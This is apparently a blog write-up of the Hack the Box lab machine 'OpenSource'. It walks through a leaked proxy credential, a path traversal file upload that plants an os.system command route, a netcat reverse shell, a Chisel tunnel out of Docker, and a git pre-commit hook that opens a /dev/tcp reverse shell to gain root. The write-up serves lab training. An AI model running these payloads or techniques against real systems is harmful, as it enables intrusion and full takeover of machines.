---
title: "Hack the Box - Opensource"
slug: "hack-the-box-opensource"
date: "2024-03-14"
excerpt: "OpenSource is an easy difficulty linux machine that features a Python HTTP server listening on port 80. After downloading the web application's source code, a Git repository is identified. Viewing the previous commits on the repository reveals a Virtual Studio Code settings file that contains a set of credentials for user `dev01`. Analysis of the application source code reveals that it is vulnerable to unrestricted file uploading and Directory traversal attacks, which can be abused in order to overwrite `views.py` and obtain Remote Command Execution. Users can leverage the RCE to obtain a reverse shell inside a Docker container. The container network can be used to enumerate the host machine internally and identify a `Gitea` instance running on port 3000. The credentials that were identified earlier can be used to login to the `Gitea` instance and download a backup of `dev01` user's SSH keys. After connecting to the host system with SSH, `Pspy` can be used to identify a cron job that is running as `root` and searches for changes in a repository found in the home directory of user `dev01`. The Git configuration file can be edited by the low level user and the `fsmonitor` parameter can be leveraged to obtain a root shell."
cover: "cover.png"
tags:
  - Git
  - RCE
  - Pspy
  - Docker
---

## Writeup
### Foothold

Download button on website gives you files for the website's source.

![Root Website](./root_website.png)

Downloaded app files contain two branches, `dev` and `public`.

![Git Branches](./git_branches.png)

Dev branch has a file difference of `settings.json` containing credentials for a proxy.
```json
{
  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
  "http.proxyStrictSSL": false
}
```

Instead of using a graphical display like the `source control` feature in `Visual Studio Code` you can use the following commands to achieve the same result.

```bash
git show-branch
git log dev --oneline
git show a76f8f7
```

![Git Difference](./git_diff.png)

There's an upload file endpoint `/upcloud`.

![Upload Website](./upload_website.png)

Looking at the code in the `/app/app/views.py` we can identify a vulnerability in the way the file is saved on the target via the file name.

```python
f = request.files['file']
file_name = get_file_name(f.filename)
file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
f.save(file_path)
```

This snipped of code works by getting the file in the request, extracting the file name and then saving it on the target.

The file path is created using `os.path.join()` and then grabs the current working directory via `os.getcwd()`. It's then placed in the `/public/uploads` directory.

A reference to the `get_file_name` function is made, this is located in the `/app/app/utils.py` file.

```python
def get_file_name(unsafe_filename):
    return recursive_replace(unsafe_filename, "../", "")
```

The `get_file_name` function replaces `../` to attempt to sanitise the file name. We are still able to take advatange of this as this has not been implemented correctly.

If we modify the request via Burp Suite and change the `filename` parameter we can upload files to any directory on the target.

First let's modify the `views.py` file and add our own route to execute code. We can append the following code to the file.
```python
@app.route('/exec')
def execute():
    return os.system(request.args.get('cmd')) 
```

This will give us a new directory `/exec` with the `cmd` parameter where we can execute code on the target.

Let's upload the new `views.py` file and intercept the request in Burp Suite.

![Modify Upload Request](./modify_upload_request.png)

The `..//` stops the `get_file_name` function from replacing the `../` preventing this attack from working.

We should see the following indicating the file was successfully uploaded.

![Upload Success](./upload_success.png)

Now we should be able to access the `/exec` directory and execute commands via the `cmd` parameter.

Let's now craft a payload, remembering to url encode it.
[https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f

rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20<LHOST>%20<LPORT>%20%3E%2Ftmp%2Ff
```

We can execute the payload using `curl`.

```bash
rlwrap nc -lnvp 9001

curl http://opensource.htb/exec?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20<LHOST>%20<LPORT>%20%3E%2Ftmp%2Ff
```

![Foothold Shell](./foothold_shell.png)

### Docker Escape

It looks like we have root already, but it's just because we are inside a Docker container.

![List Docker](./list_docker.png)

If you can recall, there were 3 ports which showed up in our `nmap` scan, 1 of which was filtered. Let's try checking to see if this port is present in our target network.

If we look at the network interfaces present on our container, we can find the gateway running on `172.17.0.1`.

![Docker Interfaces](./docker_interfaces.png)

We can try using `wget` to check port `3000` and see if there's anything.

```bash
wget http://172.17.0.1:3000
```

From the response, it looks like there is a website running. And we can `head` the file to try and determine what the website is.

![WGet Port](./wget_port.png)

Looks like the website is actually a [Gitea](https://gitea.io/en-us/) instance.

![Head Index](./head_index.png)

Let's use `Chisel` and forward port `3000` to our local machine so we can enumerate more.

You can download `Chisel` from Github [here](https://github.com/jpillora/chisel/releases/tag/v1.7.7). In this case we will use `chisel_1.7.7_linux_amd64.gz`.

Now that we have `Chisel` downloaded on our machine we have to get it onto the target. Start by creating a simple python web server.

```bash
python3 -m http.server 8080
```

Then we can just use `wget` on the target to download the file from our machine. Let's also move into the `/tmp` directory before we continue.

```bash
cd /tmp
wget http://<LHOST>:8080/chisel_1.7.7_linux_amd64 -O chisel
```

To make our `Chisel` connection we first need to create a server on our local machine using the following command.

```bash
mv chisel_1.7.7_linux_amd64 chisel
chmod +x chisel
./chisel server -p 8000 --reverse
```

On our target we make the reverse connection back to our machine.

```bash
chmod +x chisel
./chisel client <LHOST>:8000 R:172.17.0.1:3000
```

We can now visit `http://localhost:3000` and view the Gitea site hosted on `172.17.0.1`.

![Gitea Website](./gitea_website.png)

Let's try logging in using the credentials we found earlier in the `settings.json` file.

Looks like it worked.

![Gitea Dashboard](./gitea_dashboard.png)

If we visit the `dev01/home-backup` repository we find a `.ssh` folder with an `id_rsa` private key. We can now use this to login to the host of the Docker container.

```bash
chmod 600 id_rsa
ssh -i id_rsa dev01@opensource.htb
```

![Host SSH](./host_ssh.png)

### Privilege Escalation

Let's start enumerating by first uploading and running `linpeas`.

First download `linpeas` from the Github repository and start a simple python http server.

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/download/20220522/linpeas.sh
python3 -m http.server 8080
```

Then download the file on the target machine.

```bash
cd /tmp
wget http://<LHOST>:8080/linpeas.sh
```

Now we can run the script. I like to redirect the output into a file to lookover later. Also means the top won't get chopped off.

```bash
chmod +x linpeas.sh
./linpeas.sh | tee linpeas.out
```

We can exfiltrate our `linpeas.out` file to our machine using the same python web server technique but running on the target.

```bash
python3 -m http.server 8080
```

Download the file onto our machine using `wget`.
```bash
wget http://opensource.htb:8080/linpeas.out
```

If we look through the output, we notice that there is a `cron` job running as `root`. There's not much else of interest. Let's use `pspy` to see what commands are being executed via the `cron` job.

We can download `pspy` from GitHub [here](https://github.com/DominicBreuker/pspy/releases/tag/v1.2.0). I'm using `pspy64` in this case.

Again, start a simple python web server locally and download the file on the target.

```bash
python3 -m http.server 8080
```

Now we can run `pspy`.

```bash
wget http://<LHOST>:8080/pspy64 -O pspy
chmod +x pspy
./pspy
```

After waiting a little we see the following commands executed.

```bash
git add .
git commit -m Backup for 2022-05-23 
git push origin main 
/usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git
```

It's adding the files in the `dev01` home directory to a new git commit and pushing it to the `home-backup` repository we saw in the `Gitea` website previously.

We can use a built in `git` feature called `git hooks` to escalate our privleges. This feature gives you the ability to execute code before a commit is pushed so you can make sure it meets certain requirements. In this case we can run a script to execute a bash reverse shell and give us `root`.

There's a great Atlassian [article](https://www.atlassian.com/git/tutorials/git-hooks) on this exact topic.

Let's first craft our script.

```bash
#!/bin/bash

bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
```

We need to follow guidelines of `git hooks`. It requires us to place our payload in a file called `pre-commit` in the `.git/hooks` directory.

```bash
cd ~/.git/hooks

cat << EOF >> pre-commit
#!/bin/bash

bash -i >& /dev/tcp/10.10.16.13/9005 0>&1
EOF

chmod +x pre-commit
```

Make sure to setup a `netcat` listener on your machine.

```bash
rlwrap nc -lnvp <LPORT>
```

Now we wait for the `cron` job to be run and execute our payload.

And we get `root`!

![Root](./root.png)